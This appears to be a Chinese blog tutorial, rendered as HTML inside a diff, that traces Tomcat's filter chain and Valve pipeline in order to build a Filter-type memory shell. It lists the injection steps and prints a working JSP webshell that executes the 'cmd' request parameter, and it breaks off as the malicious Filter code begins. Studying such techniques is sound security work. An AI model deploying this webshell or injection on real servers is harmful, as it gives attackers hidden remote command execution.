+<span class="line"><span style="color: #ABB2BF">            &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;tomcat-websocket&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">            &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;8.5.0&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">```</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">- 从这里开始</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  ![](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405162324174.png)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">- 访问`http://localhost:8080/filter_war_exploded/filter`才会打到断点</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  跟进之后走到了`ApplicationFilterChain` 类的 `doFilter()` 方法</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  它主要是进行了 `Globals.IS_SECURITY_ENABLED`判断，也就是**全局安全服务**是否开启的判断。</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  ![image-20260405164124865](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405164124944.png)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">- 继续往下走，到了`internalDoFilter`![image-20260405164149655](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405164149684.png)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  步入`ApplicationFilterChain` 类的 `internalDoFilter()` 方法，进去看一下逻辑</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  ![image-20260405164528694](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405164528741.png)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  `internalDoFilter`里面的`filter`是通过`ApplicationFilterConfig filterConfig = filters[pos++]；`得到的</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  ​	这是的定义：</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">  ```java</span></span>
+<span class="line"><span style="color: #ABB2BF">   private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];</span></span></code></pre></div></div></figure>
+
+<p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165212040.png" srcset="/img/loading.gif" lazyload alt="image-20260405165211983"></p>
+<p>  此时我们可以看到，这个<code>filters</code>里面有两个<code>filters</code></p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165452275.png" srcset="/img/loading.gif" lazyload alt="image-20260405165452172"></p>
+<p>  <code>filters</code>0是我们自己的filters，而<code>filters</code>1是tomcat 自带的 filter</p>
+<p>  因为此时 pos 是 1 所以取到 tomcat 的 filter</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165627495.png" srcset="/img/loading.gif" lazyload alt="image-20260405165627430"></p>
+<p>  <code>filters[pos++]</code>就使得filters取到       tomcat 的 filter</p>
+<ul>
+<li><p>我们继续往里走，这里就调用了 <code>tomcat 的 filter 的 doFilter()</code> 方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405165859647.png" srcset="/img/loading.gif" lazyload alt="image-20260405165859584"></p>
+<p>再往下走，会走到 <code>chain.doFilter()</code> 这个地方<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405170135583.png" srcset="/img/loading.gif" lazyload alt="image-20260405170135539"></p>
+<p>我们会发现这一个方法会回到 <code>ApplicationFilterChain</code> 类的 DoFilter() 方法里面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405170344020.png" srcset="/img/loading.gif" lazyload alt="image-20260405170343959"></p>
+<p>再看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405171158010.png" srcset="/img/loading.gif" lazyload alt="image-20260405171157977"></p>
+<p>现在pos是2,n也是2,不进判断</p>
+<p>最终到了这里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405171303190.png" srcset="/img/loading.gif" lazyload alt="image-20260405171303151"></p>
+</li>
+</ul>
+<blockquote>
+<p>那么为什么又会回到ApplicationFilterChain的DoFilter()呢??</p>
+<p>这是因为 filter 调用的过程就是按顺序执行 FilterChain 里的 filter，每个 filter 里的 chain.doFilter 都是调用下一个 filter 的 doFilter，直到走到 tomcat 自带的最后一个 filter 调用 servlet 的 service 方法</p>
+<p>只要 Filter 链中任意一个 Filter 没有调用 <code>FilterChain.doFilter()</code> 方法，则目标 <code>Servlet.service()</code> 方法都不会被执行。</p>
+</blockquote>
+<p><strong>至此，我们的正向分析过程就结束了，得到的结论是 Filter Chain 的调用结构是一个个 doFilter() 的，最后一个 Filter 会调用 <code>Servlet.service()</code></strong></p>
+<h2 id="在访问-filter-之前的流程分析"><a href="#在访问-filter-之前的流程分析" class="headerlink" title="在访问 &#x2F;filter 之前的流程分析"></a>在访问 &#x2F;filter 之前的流程分析</h2><blockquote>
+<p>分析目的在于：假设我们基于filter去实现一个内存马，我们需要找到filter是如何被创建的。</p>
+</blockquote>
+<ul>
+<li><p>我们可以把断点下在最远的一处 <code>invoke() 方法</code>的地方,逆向分析前面的断点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405174025678.png" srcset="/img/loading.gif" lazyload alt="image-20260405174025532"></p>
+<p>我们看到现在的类是 <code>StandardEngineValve</code>，对应的 Pipeline 就是 <code>EnginePipeline</code>；它进行了 invoke() 方法的调用，这个 invoke() 方法的调用的目的地是 <code>AbstractAccessLogValve</code> 类的 invoke() 方法。其实这一步已经安排了一个 <code>request, wrapper, servlet</code> 传递的顺序。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405174738823.png" srcset="/img/loading.gif" lazyload alt="image-20260405174738693"></p>
+<p>接着是 <code>AbstractAccessLogValve</code> 类的 invoke() 方法，然后就是一步步调用 invoke() 方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405175124663.png" srcset="/img/loading.gif" lazyload alt="image-20260405175124502"> </p>
+<blockquote>
+<p> Tomcat 中，每个容器都有一个 <strong>Pipeline</strong>（管道），管道里装着多个 <strong>Valve</strong>（阀门）<code>invoke是 </code>Valve&#96; 接口中定义的核心方法</p>
+<p>请求进入管道后，会依次调用每个 Valve 的 <code>invoke()</code>。每个 Valve 处理完自己的逻辑（如记录日志、身份认证）后，会调用 <code>getNext().invoke()</code> 将请求传给下一个阀门。</p>
+</blockquote>
+<p>用一张图来表示一下:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405175143315.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>看一下每个经过的类(主要关注不属于tomcat架构的类)有什么用</p>
+<p><strong>StandardWrapperValve</strong> (调用位置: <code>invoke:96</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>StandardWrapperValve</code> 继承自 <code>ValveBase</code>，是 Tomcat 中用来处理请求的管道组件。</li>
+<li><strong>作用</strong>：负责请求到达 Tomcat 容器时，分配到具体的 Servlet，并执行该 Servlet 的生命周期方法（如 <code>service()</code>）。它也处理对 <code>ServletRequest</code> 和 <code>ServletResponse</code> 的封装。</li>
+</ul>
+<p><strong>StandardContextValve</strong> (调用位置: <code>invoke:97</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>StandardContextValve</code> 是 Tomcat 中处理 web 应用的上下文的管道组件。</li>
+<li><strong>作用</strong>：它主要处理请求的上下文（Context），会负责识别请求是否符合应用的配置要求，过滤掉无效的请求，或者将请求转发到合适的 Servlet 或 JSP。</li>
+</ul>
+<p><strong>AuthenticatorBase</strong> (调用位置: <code>invoke:543</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>AuthenticatorBase</code> 是 Tomcat 认证过程的基类，提供基本的身份验证机制。</li>
+<li><strong>作用</strong>：当请求需要进行身份验证时，这个类会处理相关的认证操作。通常是在用户请求资源时，验证用户的身份信息是否正确（比如 HTTP 基本认证或表单认证）。</li>
+</ul>
+<p><strong>StandardHostValve</strong> (调用位置: <code>invoke:135</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>StandardHostValve</code> 是用于处理虚拟主机请求的 Valve。</li>
+<li><strong>作用</strong>：它处理请求是否属于当前的虚拟主机（Host），根据虚拟主机的配置来路由请求。虚拟主机是 Tomcat 支持多站点的功能，用来根据域名分发请求到不同的应用。</li>
+</ul>
+<p><strong>ErrorReportValve</strong> (调用位置: <code>invoke:92</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>ErrorReportValve</code> 负责在请求处理过程中出错时生成错误报告。</li>
+<li><strong>作用</strong>：当发生错误（例如 HTTP 错误 404 或 500）时，<code>ErrorReportValve</code> 会生成详细的错误信息（如堆栈跟踪）并将其返回给客户端。</li>
+</ul>
+<p><strong>AbstractAccessLogValve</strong> (调用位置: <code>invoke:698</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>AbstractAccessLogValve</code> 是用于记录访问日志的基类。</li>
+<li><strong>作用</strong>：它负责将请求的详细信息（如请求的 URL、时间戳、客户端 IP 等）记录到日志文件中，以供后续分析。它支持灵活的日志格式配置，并且是 Tomcat 默认启用的访问日志功能的基础。</li>
+</ul>
+<p><strong>StandardEngineValve</strong> (调用位置: <code>invoke:78</code>)</p>
+<ul>
+<li><strong>类</strong>：<code>StandardEngineValve</code> 是 Tomcat 中的引擎级别的 Valve，负责处理跨应用的请求。</li>
+<li><strong>作用</strong>：它是在 Tomcat 中对整个引擎（Engine）进行请求处理的组件。在请求到达应用之前，它负责进行一些全局级的操作，比如进行负载均衡、跨应用请求的转发等。</li>
+</ul>
+<p>至此，invoke() 部分的所有流程我们都分析完毕了，接着继续往上看，也就是 <code>doFilter()</code> 方法。这个 <code>doFilter()</code> 方法也是由最近的那个 invoke() 方法调用的。</p>
+</li>
+<li><p>下在这里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405211810675.png" srcset="/img/loading.gif" lazyload alt="image-20260405211810616"></p>
+<blockquote>
+<p>这里我们要重点关注前文我们提到的<code>filterChain</code> 是什么?</p>
+<p>简单说就是:FilterChain（过滤器链)就是将Filter串联起来,决定先后执行顺序,是一个<strong>动态生成的执行列表</strong></p>
+<ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405212436544.png" srcset="/img/loading.gif" lazyload alt="image-20260405212436506"></p>
+</li>
+<li><p>我们跟进 <code>createFilterChain()</code> 这个方法</p>
+</li>
+</ul>
+<p> <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405212557737.png" srcset="/img/loading.gif" lazyload alt="image-20260405212557687"></p>
+<p> <strong>内部使用 <code>ApplicationFilterFactory.createFilterChain()</code> 创建了一个过滤链，将 <code>request, wrapper, servlet</code> 进行传递。</strong></p>
+<ul>
+<li><p>我们在 <code>createFilterChain()</code> 方法走一下流程</p>
+<p>先是Tomcat 会尝试获取或创建一个空的链条容器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213543040.png" srcset="/img/loading.gif" lazyload alt="image-20260405213542963"></p>
+<p><code>ApplicationFilterChain</code> 是 Filter 的<strong>载体</strong>。Tomcat 这里做了一个性能优化：如果当前请求已经有一个链条对象，就直接复用，否则创建一个新的，并把最终的目标 <code>Servlet</code> 放在链条的终点。</p>
+</li>
+<li><p>代码开始寻找容器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213637869.png" srcset="/img/loading.gif" lazyload alt="image-20260405213637834"></p>
+<p><code>StandardContext</code> 代表了你的 Web 应用。它通过 <code>findFilterMaps()</code> 获取一个<strong>数组</strong>，这个数组里存放了我们在 <code>web.xml</code> 中配置的所有 <code>&lt;filter-mapping&gt;</code> 信息。</p>
+<p><strong>内存马的本质就是修改这个 <code>filterMaps</code> 数组，向其中插入一个恶意的映射规则</strong></p>
+</li>
+<li><p>匹配 URL 路径,Tomcat 优先添加那些基于 URL 路径匹配的 Filter</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213903858.png" srcset="/img/loading.gif" lazyload alt="image-20260405213903812"></p>
+<p>遍历<code>StandardContext.filterMaps</code>得到filter与URL的映射关系并通过<code>matchDispatcher()</code>、<code>matchFilterURL()</code>方法进行匹配，匹配成功后，还需判断<code>StandardContext.filterConfigs</code>中，是否存在对应filter的实例，当实例不为空时通过<code>addFilter</code>方法，将管理filter实例的<code>filterConfig</code>添加入<code>filterChain</code>对象中。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405214339115.png" srcset="/img/loading.gif" lazyload alt="image-20260405214339057"></p>
+<p>这里使用了 <code>for</code> 循环遍历数组。<strong>谁在数组前面，谁就被先加入链条</strong></p>
+<p>因为 <code>matchFiltersURL</code> 匹配（如 <code>/*</code>）的优先级最高且最先被处理，所以内存马通常伪装成一个路径为 <code>/*</code> 的 Filter，并确保自己在 <code>filterMaps</code> 数组的 <strong>0 号位置</strong>，从而实现“最先执行”。</p>
+</li>
+<li><p>匹配 Servlet 名称,在 URL 匹配完成后，Tomcat 会进行第二次扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260405213952008.png" srcset="/img/loading.gif" lazyload alt="image-20260405213951955"></p>
+<p>这是针对那些只拦截特定 Servlet（如 <code>HelloServlet</code>）的 Filter</p>
+<p>即便你的 Filter 在 <code>web.xml</code> 里写在最后，只要你是基于 <strong>URL 路径（Path-mapped）</strong> 匹配的，你在链条中的位置也会<strong>优先于</strong>所有基于 <strong>Servlet 名称</strong> 匹配的 Filter。</p>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<p>这时候我们再进入 <code>doFilter()</code> 的方法其实是，将请求交给其 pipeline 去处理，由 pipeline 中的所有 valve 顺序处理请求。后续的就是我们前文分析过的 <strong>在访问 &#x2F;filter 之后的流程分析</strong></p>
+<h2 id="流程小结"><a href="#流程小结" class="headerlink" title="流程小结"></a>流程小结</h2><ol>
+<li><p>依次调用<code>invoke()</code></p>
+<p>层层调用管道，在最后一个管道的地方(调用 <code>ApplicationFilterFactory.createFilterChain()</code>)会创建一个链子，这个链子是 FilterChain，再对里头的 filter 进行一些相关的匹配(StandardContext对filterMaps把匹配到的所有 Filter 按照顺序装进一个 <code>ApplicationFilterChain</code> 对象里)</p>
+</li>
+<li><p>filterchain 拿出来之后</p>
+<p>进行 <code>doFilter()</code> 工作，将请求交给对应的 pipeline 去处理，也就是进行一个 <code>doFilter()</code> —-&gt; <code>internalDoFilter()</code> —-&gt; <code>doFilter()</code>；直到最后一个 filter 被调用。</p>
+</li>
+<li><p>最后一个 filter</p>
+</li>
+</ol>
+<p>   最后一个 filter 会执行完 <code>doFilter()</code> 操作，随后会跳转到 <code>Servlet.service()</code> 这里。至此，流程分析完毕。</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>上面也提到了几点</p>
+<p>主要就是构造含有恶意的 filter 的 <strong>filterConfig</strong> 和拦截器 <strong>filterMaps</strong></p>
+<p><code>filterConfig:</code>决定了你的恶意代码是什么</p>
+<p><code>filterMaps:</code>决定了你的恶意代码何时被触发以及在链条中的位置(filterMaps中的数据对应 web.xml 中的 filter-mapping 标签)</p>
+<h1 id="Filter-型内存马攻击思路分析"><a href="#Filter-型内存马攻击思路分析" class="headerlink" title="Filter 型内存马攻击思路分析"></a>Filter 型内存马攻击思路分析</h1><ul>
+<li><p>前面我们提及要操作filterMaps来实现</p>
+<p>而filterMaps 可以通过如下两个方法添加数据，对应的类是 <code>StandardContext</code> 这个类</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addFilterMap</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">FilterMap</span><span style="color: #E06C75"> filterMap) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">validateFilterMap</span><span style="color: #E06C75">(filterMap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// Add this filter mapping to our registered set</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">filterMaps</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(filterMap);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">fireContainerEvent</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;addFilterMap&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> filterMap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addFilterMapBefore</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">FilterMap</span><span style="color: #E06C75"> filterMap) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">validateFilterMap</span><span style="color: #E06C75">(filterMap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// Add this filter mapping to our registered set</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">filterMaps</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addBefore</span><span style="color: #ABB2BF">(filterMap);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">fireContainerEvent</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;addFilterMap&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> filterMap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p><code>StandardContext</code> 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。</p>
+<p>这个容器包含这三个成员变量</p>
+<ul>
+<li><p>filterMaps变量：包含所有过滤器的URL映射关系 </p>
+</li>
+<li><p>filterDefs变量：包含所有过滤器包括实例内部等变量 </p>
+</li>
+<li><p>filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，<strong>进行过滤器进行管理</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406142145020.png" srcset="/img/loading.gif" lazyload alt="image-20260406142137915"></p>
+<p>filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的<code>ApplicationFilterConfig</code>对象的键值对，在<code>ApplicationFilterConfig</code>对象中则存储了Filter实例以及该实例在web.xml中的注册信息。</p>
+<p>filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应<code>FilterDef</code>的对象的键值对，而<code>FilterDef</code>对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据</p>
+<p>filterMaps 中的<code>FilterMap</code>则记录了不同filter与<code>UrlPattern</code>的映射关系</p>
+<p>（<code>UrlPattern</code>就是在web.xml里面对应的访问路径）</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">filter-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/filter&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">filter-mapping</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li>
+</ul>
+</li>
+<li><p><strong>看对应的数据：</strong>ApplicationFilterConfig 里面存了什么东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406144936839.png" srcset="/img/loading.gif" lazyload alt="image-20260406144936665"></p>
+<p>它有三个重要的东西：<br>一个是ServletContext，一个是filter，一个是filterDef</p>
+<ul>
+<li><p>filterDef对应web.xml中的filter标签</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">filter-class</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-class</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+
+<p>从<code>org.apache.catalina.core.StandardContext#filterStart</code>中可以看到filterConfig可以通过<code>filterConfigs.put(name, filterConfig);</code>添加</p>
+<p>代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406145428366.png" srcset="/img/loading.gif" lazyload alt="image-20260406145428286"></p>
+</li>
+</ul>
+<p>通过前文分析，得出构造的主要思路如下</p>
+<ol>
+<li>获取当前应用的<code>StandardContext</code>对象</li>
+<li>通过<code>StandardContext</code>对象再获取<code>filterConfigs</code></li>
+<li>接着实现自定义想要注入的<code>filter对象</code></li>
+<li>然后为自定义对象的<code>filter</code>创建一个<code>FilterDef</code></li>
+<li>最后把 <code>ServletContext对象</code>、<code>filter对象</code>、<code>FilterDef</code>全部都设置到filterConfigs即可完成内存马的实现</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406150746288.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+</ul>
+<h1 id="Filter-型内存马的实现"><a href="#Filter-型内存马的实现" class="headerlink" title="Filter 型内存马的实现"></a>Filter 型内存马的实现</h1><h2 id="静态演示"><a href="#静态演示" class="headerlink" title="静态演示"></a>静态演示</h2><ul>
+<li><p>有回显的木马（比无回显多个输入输出）</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #56B6C2">!=</span><span style="color: #D19A66">null</span><span style="color: #E06C75">){</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">java</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">io</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InputStream</span><span style="color: #E06C75"> in </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> a </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] b </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[</span><span style="color: #D19A66">2048</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&lt;pre&gt;&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">while</span><span style="color: #E06C75">((a</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">in</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">(b)</span><span style="color: #E06C75">)</span><span style="color: #56B6C2">!=-</span><span style="color: #D19A66">1</span><span style="color: #E06C75">){</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">print</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">String</span><span style="color: #ABB2BF">(b));</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&lt;/pre&gt;&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406151550263.png" srcset="/img/loading.gif" lazyload alt="image-20260406151550191"></p>
+</li>
+<li><p>把这个恶意的有回显的🐎插入到 Filter 里面进去，也就是说要配置一个恶意的 Filter</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.*</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
